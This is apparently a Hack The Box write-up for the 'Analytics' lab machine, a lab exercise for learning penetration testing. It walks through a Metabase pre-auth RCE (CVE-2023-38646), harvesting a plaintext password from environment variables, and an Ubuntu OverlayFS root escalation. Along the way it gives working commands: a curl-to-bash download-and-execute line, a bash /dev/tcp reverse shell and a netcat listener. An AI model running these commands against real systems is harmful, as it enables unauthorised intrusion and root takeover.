---
layout: post
title: Hack The Box - Analytics
date: 2023-10-09 22:43 +0200
image:
  path: /assets/img/posts/analytics/analytics-card.png
  alt: Analytics card
categories: [Hack The Box]
tags: [Hack-The-Box-Easy]
---

Analytics machine is an easy one,

```
HOST: 10.10.11.233
```

## Enumeration

### Nmap Scan

```bash
┌──(rether㉿rether)-[~]
└─$ nmap -A 10.10.11.233
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 23:08 CEST
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Analytical
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The nmap result shows an http server on tcp port 80.

### HTTP - Port 80

!["Analytics home page"](/assets/img/posts/analytics/analytics-home-page.png "Analytics home page")

By looking in the login we found that the authentification was under metabase.

!["Analytics login page"](/assets/img/posts/analytics/analytics-login-page.png "Analytics login page")

By digging a little bit we found a this [CVE](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/),

### Metabase Pre-Auth RCE - CVE-2023-38646

We use this poc and the reverse shell from this [github repository](https://github.com/securezeron/CVE-2023-38646)

#### POC

```bash
python3 CVE-2023-38646-POC.py --ip data.analytical.htb
```

We see that the poc work so now we can try to get a revershell

#### Reverse shell

To get the reverse shell we can run the following command:

```bash
python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb/ --lhost 10.10.16.3 --lport 4444
```

## Get ssh credentials

Now we have access to the machine (maybe not) we are in a docker.

By running the `env` command we can show the environment variables.

```bash
ad85365e4b18:/$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=ad85365e4b18
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/app
```

Looking the `META_USER` and the `META_PASS` look ssh credentials

```bash
┌──(rether㉿rether)-[~]
└─$ ssh metalytics@10.10.11.233
metalytics@10.10.11.233's password:
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$ cat user.txt
[user-flag]
```

Now we are in.

## Root priviliege

```bash
uname -a
```

[Ubuntu local privilege](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/)

**Ubuntu Local Privilege Escalation POC**

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'"
```

**Ubuntu Local Privilege Escalation Exploitation**

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("curl 10.10.16.3:9090/shell|bash")'
```

shell file

```bash
bash -i >& /dev/tcp/10.10.16.3/4444 0>&1
```

```bash
python3 -m http.server 9090
```

```bash
┌──(rether㉿rether)
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.233] 44378
root@analytics:~# id
id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
root@analytics:~# cat /root/root.txt
cat /root/root.txt
[root-flag]
```
